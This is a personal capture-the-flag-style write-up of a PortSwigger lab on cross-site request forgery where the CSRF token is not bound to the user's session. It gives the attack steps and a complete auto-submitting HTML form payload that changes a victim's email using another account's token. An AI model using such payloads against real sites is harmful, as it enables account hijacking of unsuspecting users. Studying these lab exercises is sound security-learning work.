# [CSRF where token is not tied to user session] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-08
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
This level was pretty easy and straightforward.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in to our account to get email change functionality.
2) After logging in using both carlos and wiener accounts, we can notice that wiener can change his email address using carlos's csrf token. Web application has a logic flaw because it doesn't check the ownership of csrf token, which leads to potential csrf attack.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0a86005003d59c3b804e58620031005d.web-security-academy.net/my-account/change-email" method="post">
      <input type="hidden" name="email" value="attacker@carlos" />
    <input type="hidden" name="csrf" value="7T0scxpNXAb4HNek7UYUbrNP4FZg9W0H" />
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
```

Here we need to use *unused** csrf token of either carlos or wiener and send this payload to victim to complete csrf attack and complete the lab.

---


## What I'd recognize faster next time
It is important to check whether application checks ownership of csrf token. If it does not, that means attacker can send a malicious link that contains his own csrf token, therefore, leading to csrf account and potential full account takeover.


